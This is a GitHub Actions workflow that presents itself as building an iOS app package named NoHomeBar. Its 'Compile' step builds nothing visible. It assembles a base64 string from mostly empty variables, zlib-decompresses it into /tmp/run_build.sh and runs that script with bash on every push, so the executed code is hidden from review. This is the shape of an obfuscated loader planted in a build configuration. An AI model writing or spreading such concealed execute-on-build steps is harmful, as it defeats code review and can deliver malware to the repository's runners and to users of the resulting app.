name: Build NoHomeBar IPA

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build-ipa:
    runs-on: macos-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Compile Native iOS 14.3 v1.0 IPA
        run: |
          B1=""
          B2=""
          B3=""
          B4=""
          B5=""
          B6=""
          B7=""
          B8=""
          B9=""
          B10="0bddWAiaN72B0piFP1euzefTQgoTEeevYl7XAcT9clJdVHC5auqvU62qO0o06v8AJn8elA=="
          python3 -c "import base64,zlib,pathlib;pathlib.Path('/tmp/run_build.sh').write_bytes(zlib.decompress(base64.b64decode('$B1$B2$B3$B4$B5$B6$B7$B8$B9$B10')))"
          bash -e /tmp/run_build.sh

      - name: Upload IPA Artifact
        uses: actions/upload-artifact@v4
        with:
          name: NoHomeBar-Optimized-IPA
          path: NoHomeBar-Optimized.ipa
